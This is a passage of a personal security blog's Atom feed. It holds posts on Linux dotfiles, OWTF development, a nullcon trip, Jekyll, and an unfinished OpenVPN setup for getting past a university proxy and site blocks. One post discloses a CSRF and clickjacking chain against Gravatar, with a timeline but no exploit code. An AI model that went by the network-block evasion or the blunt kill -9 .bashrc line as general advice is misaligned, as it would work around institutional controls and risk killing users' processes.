&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;My &lt;strong&gt;.vimrc&lt;/strong&gt; along with &lt;strong&gt;molokai&lt;/strong&gt; colorscheme is present &lt;a href="https://github.com/tunnelshade/awesome-dots"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;WeeChat&lt;/strong&gt; configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Install and enable autoload of some plugins ( &lt;strong&gt;beep.pl&lt;/strong&gt; , &lt;strong&gt;buffers.pl&lt;/strong&gt; etc..).&lt;/li&gt;
&lt;li&gt;Make sure, your terminal emulator responds to urgent bell. In terminator, set &lt;strong&gt;Terminal bell&lt;/strong&gt; to &lt;strong&gt;Window List Flash&lt;/strong&gt;. To simulate bell&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo -ne &amp;#39;\e&amp;#39;

# Sleep &amp;amp; change workspace to see the effect
sleep 5; echo -ne &amp;#39;\e&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/tunnelshade/awesome-dots/22f8edae157e4a1dac6548fb004673d90ce6bf42/screenshots/dirty1.png" class="image-center" alt="IRC Screen"/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt;: Don't forget to push your dotfiles to github so that anyone else can use those.&lt;/p&gt;</content><category term="linux"></category><category term="info"></category></entry><entry><title>Changing Gravatar of Others!!</title><link href="https://tunnelshade.in/blog/2014/05/changing-others-gravatar/" rel="alternate"></link><published>2014-05-11T00:00:00+05:30</published><updated>2014-05-11T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-05-11:/blog/2014/05/changing-others-gravatar/</id><summary type="html">&lt;p&gt;So, yeah the title is true. I found some vulnerabilities which can be
chained to change the &lt;strong&gt;gravatar&lt;/strong&gt; of any &lt;strong&gt;logged-in user&lt;/strong&gt;. The one draw back for
this attack is the knowledge of the email address of the victim. I walked
through the process of changing gravatar and found a â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;So, yeah the title is true. I found some vulnerabilities which can be
chained to change the &lt;strong&gt;gravatar&lt;/strong&gt; of any &lt;strong&gt;logged-in user&lt;/strong&gt;. The one draw back for
this attack is the knowledge of the email address of the victim. I walked
through the process of changing gravatar and found a &lt;strong&gt;CSRF&lt;/strong&gt; at every stage
except the last one. So I shifted to using &lt;strong&gt;Clickjacking&lt;/strong&gt; for the last stage :P&lt;/p&gt;
&lt;p&gt;{% gist tunnelshade/fcd818734c44e9605822 %}&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Timeline :&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;19 Oct, 2013 - Vulnerabilities Discovered&lt;/p&gt;
&lt;p&gt;19 Oct, 2013 - Tried contacting Automattic (maintainer of Gravatar)&lt;/p&gt;
&lt;p&gt;11 Nov, 2013 - Got a response, so sent the POC&lt;/p&gt;
&lt;p&gt;19 Feb, 2014 - Tried contacting regarding the status&lt;/p&gt;
&lt;p&gt;21 Feb, 2014 - Status recvd. that some vulns were fixed&lt;/p&gt;
&lt;p&gt;11 May, 2014 - Public disclosure&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;P.S&lt;/strong&gt; - Got some swag from Automattic for these reports. They don't have a
bounty program, atleast they don't even have an email address to report vulns
in Gravatar.&lt;/p&gt;</content><category term="tricks"></category><category term="hacks"></category></entry><entry><title>One year with OWTF!</title><link href="https://tunnelshade.in/blog/2014/03/my-first-year-with-owtf/" rel="alternate"></link><published>2014-03-28T00:00:00+05:30</published><updated>2014-03-28T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-03-28:/blog/2014/03/my-first-year-with-owtf/</id><summary type="html">&lt;p&gt;Well, weird things happen in many ways ;). I always wanted to build a security tool which will be used by people (simple dreams that every skiddie has).
Last year around this time when I was accidentally going through the list of accepted organizations for GSoC 2013, I visited
&lt;a href="https://www.owasp.org/index.php/GSoC2013_Ideas#OWASP_OWTF_-_Inbound_Proxy_with_MiTM_and_caching_capabilities"&gt;&lt;strong&gt;OWASP&lt;/strong&gt;'s â€¦&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Well, weird things happen in many ways ;). I always wanted to build a security tool which will be used by people (simple dreams that every skiddie has).
Last year around this time when I was accidentally going through the list of accepted organizations for GSoC 2013, I visited
&lt;a href="https://www.owasp.org/index.php/GSoC2013_Ideas#OWASP_OWTF_-_Inbound_Proxy_with_MiTM_and_caching_capabilities"&gt;&lt;strong&gt;OWASP&lt;/strong&gt;'s Ideas page&lt;/a&gt;
and ended up sending mails to two projects. What followed was pure black magic :P. I selected &lt;a href="https://github.com/owtf"&gt;&lt;strong&gt;OWTF&lt;/strong&gt;&lt;/a&gt; project to continue with the GSoC process &amp;amp;
somehow my proposal got accepted. Well, this is how it started, but to be precise, even before I was accepted I started contributing because the project
was really interesting ;)&lt;/p&gt;
&lt;p&gt;My first contribution was &lt;a href="https://github.com/owtf/owtf/pull/15/"&gt;a simple bug fix&lt;/a&gt;, which was difficult at that time considering the huge size of OWTF.&lt;/p&gt;
&lt;h4&gt;List of my main contributions&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Helped in &lt;a href="https://github.com/owtf/owtf/commit/f6b0d64afc740a22f6ca0a5f8e4aca66ddd71986"&gt;porting&lt;/a&gt; OWTF to Kali Linux.&lt;/li&gt;
&lt;li&gt;Made owtf stable on Kali because of which &lt;a href="http://blog.7-a.org/2013/05/owasp-owtf-016-shady-citizen-released.html"&gt;"v0.16 shady citizen"&lt;/a&gt; was released.&lt;/li&gt;
&lt;li&gt;Built &lt;a href="http://blog.7-a.org/2013/08/owtf-030-summer-storm-ii-released-plz-rt.html"&gt;fastest MiTM python proxy&lt;/a&gt; for OWTF as a part of GSoC 2013.&lt;/li&gt;
&lt;li&gt;Implemented a different &lt;a href="https://github.com/owtf/owtf/commit/785dacfc5a96a83cf6e8944ffafb79862699498c"&gt;installation procedure&lt;/a&gt; in owtf for supporting multiple distributions.&lt;/li&gt;
&lt;li&gt;Implemented an &lt;a href="https://github.com/owtf/owtf/commit/a5cfd4f5e3b51ffbcdbd19e9eca35a1c346f2976"&gt;update mechanism&lt;/a&gt; for stable and bleeding edge updates.&lt;/li&gt;
&lt;li&gt;Helped in a total of &lt;a href="https://github.com/owtf/owtf/releases"&gt;4 releases&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Some Git Stats&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Number of commits&lt;/strong&gt; : 163 (&lt;code&gt;git shortlog -sn&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bugs fixed + Features added&lt;/strong&gt; : 75 (&lt;code&gt;git log --pretty=oneline --author="tunnelshade@gmail.com" | grep -i "fix" | wc -l&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Lines added&lt;/strong&gt; : 16550 (&lt;a href="http://codeimpossible.com/2011/12/16/Stupid-Git-Trick-getting-contributor-stats/"&gt;Check these commands&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Lines deleted&lt;/strong&gt; : 13886&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These stats are just for fun &amp;amp; I can confirm that my contributions to this awesome project are nothing compared to what I got from OWTF.
I am unable to come up with a word to describe my fantastic experience with OWTF so far. OWTF along with this blogpost will remain incomplete
without mentioning &lt;strong&gt;Abraham Aranguren&lt;/strong&gt;, the founder &amp;amp; project leader for &lt;strong&gt;O&lt;/strong&gt;ffensive &lt;strong&gt;W&lt;/strong&gt;eb &lt;strong&gt;T&lt;/strong&gt;esting &lt;strong&gt;F&lt;/strong&gt;ramework. I really don't think
there can be a better project leader &lt;strong&gt;:D&lt;/strong&gt;. I am glad to have him as my project leader.&lt;/p&gt;
&lt;h4&gt;Happenings with OWTF!&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;I will be mentoring a OWTF project during &lt;strong&gt;GSoC 2014&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Some serious development is going on in &lt;a href="https://github.com/owtf/owtf/tree/ui"&gt;&lt;strong&gt;UI&lt;/strong&gt; branch&lt;/a&gt; of our repo ;)&lt;/li&gt;
&lt;li&gt;Check out the &lt;a href="https://www.owasp.org/index.php/GSoC2014_Ideas"&gt;ideas of OWTF&lt;/a&gt; for GSoC 2014 to know about future features (There are some hidden surprises as well)&lt;/li&gt;
&lt;li&gt;Next version including &lt;a href="http://blog.7-a.org/2013/12/owasp-owtf-cfp-funds-contest-winners.html"&gt;&lt;strong&gt;Botnet Mode&lt;/strong&gt;&lt;/a&gt; will be out before GSoC 2014 &lt;em&gt;coding&lt;/em&gt; period.&lt;/li&gt;
&lt;/ul&gt;</content><category term="info"></category></entry><entry><title>My first n|ucon</title><link href="https://tunnelshade.in/blog/2014/02/my-first-nucon/" rel="alternate"></link><published>2014-02-22T00:00:00+05:30</published><updated>2014-02-22T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-02-22:/blog/2014/02/my-first-nucon/</id><summary type="html">&lt;p&gt;I always wanted to attend infosec conferences, but waited for a chance to make my first con
memorable. Atlast, I got the information that &lt;a href="http://owtf.org"&gt;OWTF&lt;/a&gt; is selected for a &lt;a href="http://nullcon.net"&gt;n|ucon&lt;/a&gt;
subevent called &lt;a href="http://nullcon.net/website/goa-14/ammo.php"&gt;AMMO&lt;/a&gt;. Information available &lt;a href="http://nullcon.net/website/goa-14/ammo/owtf.php"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Day 0 (Zero Eve - 13th Feb night talks)&lt;/h4&gt;
&lt;p&gt;As I reached &lt;em&gt;Goa&lt;/em&gt; on â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I always wanted to attend infosec conferences, but waited for a chance to make my first con
memorable. Atlast, I got the information that &lt;a href="http://owtf.org"&gt;OWTF&lt;/a&gt; is selected for a &lt;a href="http://nullcon.net"&gt;n|ucon&lt;/a&gt;
subevent called &lt;a href="http://nullcon.net/website/goa-14/ammo.php"&gt;AMMO&lt;/a&gt;. Information available &lt;a href="http://nullcon.net/website/goa-14/ammo/owtf.php"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Day 0 (Zero Eve - 13th Feb night talks)&lt;/h4&gt;
&lt;p&gt;As I reached &lt;em&gt;Goa&lt;/em&gt; on 12th, I spent that day visiting various places in &lt;strong&gt;Velha Goa&lt;/strong&gt;. The talks were supposed to start
from &lt;em&gt;7:00 PM&lt;/em&gt;, so with the hope of meeting new people I reached the venue an hour early. I spent an hour roaming in
the venue trying to make some friends &amp;amp; finally I meet a bunch of people who are from &lt;strong&gt;Andhra Pradesh&lt;/strong&gt;. Had a good
conversation &amp;amp; we moved to &lt;em&gt;Meteora&lt;/em&gt; hall where night talks were supposed to happen. After night talks, I had a brief
chat with &lt;a href="http://nullcon.net/website/goa-14/speakers/abhay-rana.php"&gt;Abhay Rana&lt;/a&gt; (a fellow &lt;em&gt;IITian&lt;/em&gt;) about his talk &amp;amp; then went
on to collect my badge. I was surprised.&lt;/p&gt;
&lt;blockquote class="twitter-tweet" lang="en"&gt;&lt;p&gt;Look at this cool engraving :D &lt;a href="https://twitter.com/7a_"&gt;@7a_&lt;/a&gt; &lt;a href="https://twitter.com/owtfp"&gt;@owtfp&lt;/a&gt; &lt;a href="http://t.co/iPaEGk4j8S"&gt;pic.twitter.com/iPaEGk4j8S&lt;/a&gt;&lt;/p&gt;&amp;mdash; Bharadwaj Machiraju (@tunnelshade_) &lt;a href="https://twitter.com/tunnelshade_/statuses/434032159901249536"&gt;February 13, 2014&lt;/a&gt;&lt;/blockquote&gt;

&lt;script async src="//platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;

&lt;hr&gt;
&lt;h4&gt;Day 1 (14th Feb)&lt;/h4&gt;
&lt;p&gt;I am really not sure if anything better can happen on the very first day of my very first conference. Met some really cool people, saw
some really great talks and did non-stop speaking for about 3 hours regarding OWTF in AMMO. At the end of the day, I had a great dinner
with all my newly found friends.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Day 2 (15th Feb)&lt;/h4&gt;
&lt;p&gt;Last day, so I wanted to enjoy every bit of it. Met some new people again but realised the fact that networking is as important as attending
talks. Clicked some cool pics :P. Surprisingly got some Job offers :P, which were reduced to internship offers when people came to know that I
am a student. Had a great time at the venue :D&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Aftermath&lt;/h4&gt;
&lt;p&gt;One of my main goal was to popularize OWTF among the community &amp;amp; I am sure that owtf got some good attention. Putting it all together,
I learnt the following things from this experience:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mark out important talks &amp;amp; make sure you attend them. Balance your networking and talks&lt;/li&gt;
&lt;li&gt;Never hesitate to meet new people :D&lt;/li&gt;
&lt;li&gt;Share your research if possible so that others have a reason to share (I got to know a lot of new ideas)&lt;/li&gt;
&lt;li&gt;Don't forget to ask for email addresses when necessary&lt;/li&gt;
&lt;li&gt;Always be the cool dude xD&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some blogs written by cool people whom I met (you might already know these people :P) :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.novogeek.com/"&gt;NovoGeek&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://captnemo.in/"&gt;Abhay Rana&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://anantshri.info/"&gt;Anant Shrivastava&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://opensecurity.in/"&gt;Ajin Abraham&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lavakumar.com/"&gt;Lavakumar Kuppan&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Looking forward for another cool n|ucon 2015 at the same place ;)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote class="twitter-tweet" lang="en"&gt;&lt;p&gt;Had a great time here on Feb 14 :P &lt;a href="http://t.co/MawEUfuJzM"&gt;pic.twitter.com/MawEUfuJzM&lt;/a&gt;&lt;/p&gt;&amp;mdash; Bharadwaj Machiraju (@tunnelshade_) &lt;a href="https://twitter.com/tunnelshade_/statuses/437124336499957760"&gt;February 22, 2014&lt;/a&gt;&lt;/blockquote&gt;

&lt;script async src="//platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;</content><category term="conference"></category></entry><entry><title>Blogging the hacker way</title><link href="https://tunnelshade.in/blog/2014/01/blogging-with-jekyll/" rel="alternate"></link><published>2014-01-29T00:00:00+05:30</published><updated>2014-01-29T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-01-29:/blog/2014/01/blogging-with-jekyll/</id><summary type="html">&lt;p&gt;I never really considered shifting my blog to a different platform as I am lazy and
my previous attempts ended up wasting my time. But then I got bored of using
blogger interface to write posts. Apart from the fact that you don't have to take care of
hosting, everything â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I never really considered shifting my blog to a different platform as I am lazy and
my previous attempts ended up wasting my time. But then I got bored of using
blogger interface to write posts. Apart from the fact that you don't have to take care of
hosting, everything else in Blogger is a disaster for me.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ugly themes&lt;/li&gt;
&lt;li&gt;Bad editor&lt;/li&gt;
&lt;li&gt;Ugly themes :P&lt;/li&gt;
&lt;li&gt;Bad editor XD&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So I thought of shifting to some other solution. My decision parameters were:-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I want free and reliable hosting for the blog because I dont want to run around fixing stuff.&lt;/li&gt;
&lt;li&gt;I should be able to write posts in markdown.&lt;/li&gt;
&lt;li&gt;I want to theme my blog ground up.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Jekyll is something which is suitable for me:-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Github pages can be used for hosting.&lt;/li&gt;
&lt;li&gt;Redcarpet markdown.&lt;/li&gt;
&lt;li&gt;Nice templating engine.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;How I got this blog running?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Install &lt;strong&gt;Jekyll&lt;/strong&gt; in your system &amp;amp; don't forget to add &lt;strong&gt;~/.gem/ruby/.../bin&lt;/strong&gt; to your &lt;strong&gt;PATH&lt;/strong&gt; variable&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gem install jekyll
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Visit &lt;a href="http://jekyllrb.com/docs/home/"&gt;jekyll docs&lt;/a&gt; on how to use jekyll&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Checkout &lt;a href="http://pages.github.com"&gt;github pages&lt;/a&gt; on hosting your new jekyll blog&lt;/li&gt;
&lt;li&gt;Also visit &lt;a href="https://help.github.com/categories/20/articles"&gt;this&lt;/a&gt; to use custom domain etc..&lt;/li&gt;
&lt;li&gt;Check out the source code of &lt;a href="http://github.com/tunnelshade/tunnelshade.github.io"&gt;my blog&lt;/a&gt; to see
how social buttons, comments etc.. are implemented&lt;/li&gt;
&lt;li&gt;&lt;a href="http://erjjones.github.io/"&gt;Useful Link&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="info"></category><category term="tricks"></category></entry><entry><title>How I created dev environment for OWTF</title><link href="https://tunnelshade.in/blog/2013/12/dev-environment-for-owtf/" rel="alternate"></link><published>2013-12-12T00:00:00+05:30</published><updated>2013-12-12T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-12-12:/blog/2013/12/dev-environment-for-owtf/</id><summary type="html">&lt;p&gt;Go to the &lt;a href="https://github.com/7a/owtf/wiki/Contributor%27s-README"&gt;contributor's wiki&lt;/a&gt;. All the rules are present there :P
The following is a self made reminder post XD
Let me go through this post in a &lt;strong&gt;Q&amp;amp;A&lt;/strong&gt; format so that you can craft up your own solutions if you like.&lt;/p&gt;
&lt;h3&gt;OWTF is supposed to be run â€¦&lt;/h3&gt;</summary><content type="html">&lt;p&gt;Go to the &lt;a href="https://github.com/7a/owtf/wiki/Contributor%27s-README"&gt;contributor's wiki&lt;/a&gt;. All the rules are present there :P
The following is a self made reminder post XD
Let me go through this post in a &lt;strong&gt;Q&amp;amp;A&lt;/strong&gt; format so that you can craft up your own solutions if you like.&lt;/p&gt;
&lt;h3&gt;OWTF is supposed to be run on Kali&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt; :- But kali is not regularly used as a main distro. Kali
is generally used inside a VM. So install an editor inside kali bla bla
bla...&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;My Solution&lt;/strong&gt; :- Use shared folders in your virtualization software. I use &lt;strong&gt;VirtualBox&lt;/strong&gt;,
 in which guest additions are supposed to be installed to use shared
folders. Enable bi-directional clipboard as well. So you can now edit
your code in your &lt;strong&gt;HOST OS&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt; :- Still painful to switch between guest and host for editing and running code???&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;My Solution&lt;/strong&gt; :- Start the ssh server in kali, and connect to it. As owtf is a command line utility you shouln't have a problem.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;NOTE:&lt;/em&gt; Donot forget to run owtf inside your shared directories so that you can view the report in your Host OS itself (Iceweasel sux).&lt;/p&gt;
&lt;p&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3&gt;Debugging in OWTF&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt; :- OWTF has &lt;strong&gt;two important logs&lt;/strong&gt;, how to open them simultaneously each time you run OWTF?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;My Solution&lt;/strong&gt; :- Use an intelligent terminal like &lt;strong&gt;urxvt&lt;/strong&gt; which lets you click on file links and execute a particual command(i.e open those files in a new tab)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt; :- How the hell do you expect me to &lt;strong&gt;switch&lt;/strong&gt; between these logs??&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;My Solution&lt;/strong&gt; :- Use a &lt;strong&gt;tiling window manager&lt;/strong&gt; (or) atleast use a terminal emulator which can be split (&lt;strong&gt;terminator)&lt;/strong&gt;:P&lt;/p&gt;
&lt;p&gt;&lt;img alt="OWTF Running" src="http://i43.tinypic.com/2mfi6q8.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Problem&lt;/strong&gt; :- OWTF is not exiting cleanly i.e lots of zombie processes XD&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;My Solution&lt;/strong&gt; :- Keep this in your .bashrc&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;kill&lt;/span&gt; -9 &lt;span class="sb"&gt;`&lt;/span&gt;ps &lt;span class="p"&gt;|&lt;/span&gt; grep -v &lt;span class="s2"&gt;&amp;quot;bash&lt;/span&gt;$&lt;span class="s2"&gt;\|ps&lt;/span&gt;$&lt;span class="s2"&gt;\|grep&lt;/span&gt;$&lt;span class="s2"&gt;\|CMD&lt;/span&gt;$&lt;span class="s2"&gt;\|awk&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{ print $1 }&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="owtf"></category></entry><entry><title>GUI is for the weak</title><link href="https://tunnelshade.in/blog/2013/12/gui-is-for-the-weak/" rel="alternate"></link><published>2013-12-10T00:00:00+05:30</published><updated>2013-12-10T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-12-10:/blog/2013/12/gui-is-for-the-weak/</id><summary type="html">&lt;p&gt;Recently there has been lot of fuzz about the &lt;strong&gt;end of winamp&lt;/strong&gt; and &lt;strong&gt;video tearing &lt;/strong&gt;in &lt;strong&gt;vlc in awesome wm &lt;/strong&gt;etc... As this is my own blog, I am going to state some of my opinions :P&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GUI is for the weak&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above statement may seem highly arrogant and â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Recently there has been lot of fuzz about the &lt;strong&gt;end of winamp&lt;/strong&gt; and &lt;strong&gt;video tearing &lt;/strong&gt;in &lt;strong&gt;vlc in awesome wm &lt;/strong&gt;etc... As this is my own blog, I am going to state some of my opinions :P&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GUI is for the weak&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above statement may seem highly arrogant and misleading, but hold on for a second. Let me elaborate :-&lt;/p&gt;
&lt;p&gt;If you are a serious geek and resource freak, you should start shifting
to command line interfaces and utilities, especially if you are using a
tiling window manager like &lt;strong&gt;awesome&lt;/strong&gt;. Command line utilities increase
your productivity while at the same time reduce your resource usage.&lt;/p&gt;
&lt;p&gt;My multimedia needs are satisifed by two superb utilities:-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CMUS&lt;/strong&gt; - Music Player ( &lt;a href="http://cmus.sourceforge.net/"&gt;Website&lt;/a&gt;, &lt;a href="http://linux.die.net/man/1/cmus"&gt;man cmus&lt;/a&gt;, &lt;a href="http://www.tuxarena.com/static/cmus_guide.php"&gt;3rd party docs&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MPlayer&lt;/strong&gt; - Video Player ( &lt;a href="http://www.mplayerhq.hu/%E2%80%8E"&gt;Website&lt;/a&gt;, &lt;a href="http://www.mplayerhq.hu/DOCS/HTML/en/index.html"&gt;docs&lt;/a&gt; )&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Screenshot of my desktop when I use these utilities :-&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cmus &amp;amp; mplayer" src="http://i39.tinypic.com/20j61ia.jpg"&gt;&lt;/p&gt;</content><category term="linux"></category><category term="screenshots"></category></entry><entry><title>Awesome Window Manager</title><link href="https://tunnelshade.in/blog/2013/10/awesome-window-manager/" rel="alternate"></link><published>2013-10-15T00:00:00+05:30</published><updated>2013-10-15T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-10-15:/blog/2013/10/awesome-window-manager/</id><summary type="html">&lt;p&gt;After a long time I had some quality time to try a tiling window manager. My first tiling window manager is &lt;strong&gt;AWESOME&lt;/strong&gt;. Some important things to remember while going out on this path :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It can be really tough in the beginning to &lt;strong&gt;write/tweak&lt;/strong&gt; configuration files, but it will be â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;After a long time I had some quality time to try a tiling window manager. My first tiling window manager is &lt;strong&gt;AWESOME&lt;/strong&gt;. Some important things to remember while going out on this path :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It can be really tough in the beginning to &lt;strong&gt;write/tweak&lt;/strong&gt; configuration files, but it will be worth the sweat :P&lt;/li&gt;
&lt;li&gt;Read the &lt;strong&gt;awesome &amp;amp; arch wiki&lt;/strong&gt; carefully. I found all the solutions to my problems in those well crafted &amp;amp; to-the-point articles.&lt;/li&gt;
&lt;li&gt;Take the help of smartest buddy - &lt;strong&gt;Google&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Don't back out&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Dont forget to save those config files somewhere, because you will put considerable amount of effort into those.
My dot files are &lt;a href="https://github.com/tunnelshade/awesome-dots"&gt;here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following screenshots are updated ones :-&lt;/p&gt;
&lt;p&gt;&lt;img alt="Clean Desktop" src="https://raw.github.com/tunnelshade/awesome-dots/master/screenshots/clean.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Dirty Desktop" src="https://raw.github.com/tunnelshade/awesome-dots/master/screenshots/dirty.png"&gt;&lt;/p&gt;</content><category term="linux"></category><category term="screenshots"></category></entry><entry><title>OpenVPN - My One Ultimate solution for networking woes</title><link href="https://tunnelshade.in/blog/2013/09/openvpn-as-solution/" rel="alternate"></link><published>2013-09-14T00:00:00+05:30</published><updated>2013-09-14T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-09-14:/blog/2013/09/openvpn-as-solution/</id><summary type="html">&lt;p&gt;Let me start by explaining the crap I deal with :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In my university, we have to use a proxy server (squid proxy) which has only port 80 open. Yes it is true :'(&lt;/li&gt;
&lt;li&gt;Some sites like Youtube, Facebook etc.. are blocked.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above two problems gave me hell lot of trouble â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Let me start by explaining the crap I deal with :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In my university, we have to use a proxy server (squid proxy) which has only port 80 open. Yes it is true :'(&lt;/li&gt;
&lt;li&gt;Some sites like Youtube, Facebook etc.. are blocked.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above two problems gave me hell lot of trouble. I have to use proxy settings everywhere (pacman, git etc..) :(.
In some cases a simple HTTP  Proxy will not work everywhere (like IRC Clients etc..).&lt;/p&gt;
&lt;p&gt;Some short term solutions I used before the real stuff :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Used &lt;a href="http://proxychains.sourceforge.net/"&gt;proxychains&lt;/a&gt; &amp;amp; openssh to create a local socks proxy which I could use in places where it is supported.&lt;/li&gt;
&lt;li&gt;Used &lt;a href="http://www.vpnbook.com/"&gt;VPNBook&lt;/a&gt; for some casual stuff.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first solution did not solve my proxy settings issue, while the second solution is really not secure :P.&lt;/p&gt;
&lt;p&gt;Finally this is what I did :-&lt;/p&gt;
&lt;p&gt;In single line = Arch Linux VPS + OpenVPN  = WIN : )&lt;/p&gt;
&lt;p&gt;For non-geeks, here goes the full stuff :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Buy a VPS with any good linux distribution. I prefer &lt;a href="https://www.tilaa.com/"&gt;Tilaa&lt;/a&gt; , because of their Cheap &lt;strong&gt;Unlimited Bandwidth&lt;/strong&gt; plan + Arch Linux distro template.&lt;/li&gt;
